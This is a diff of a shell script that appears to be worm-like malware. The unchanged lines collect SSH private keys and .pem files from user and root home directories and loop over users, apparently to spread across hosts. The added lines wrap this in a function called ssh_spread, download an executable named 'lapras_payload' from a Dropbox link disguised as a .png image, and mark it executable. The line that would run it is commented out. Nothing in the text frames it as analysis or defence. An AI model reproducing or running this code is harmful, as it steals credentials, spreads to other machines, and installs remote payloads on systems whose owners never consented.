@@ -1,5 +1,7 @@
+export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
 
 
+ssh_spread() {
 KEYS1=$(find ~/ /root /home -maxdepth 2 -name 'id_rsa*' | grep -vw pub)
 KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '(print $2 )')
 KEYS3=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
@@ -26,7 +28,15 @@ for user in $users; do
         done
     done
 done
+}
 
+# we need to download the final executable and run it
+curl -L -o lapras_payload https://www.dropbox.com/scl/fi/qjoyx52sxn8mfhgggg5a4/98.png?rlkey=s6jia0fivu7gcycwcliz45tk6&st=n1ojh54u&dl=0
 
+echo "download done!"
+
+chmod +x lapras_payload
+
+# ./lapras_payload
 
 
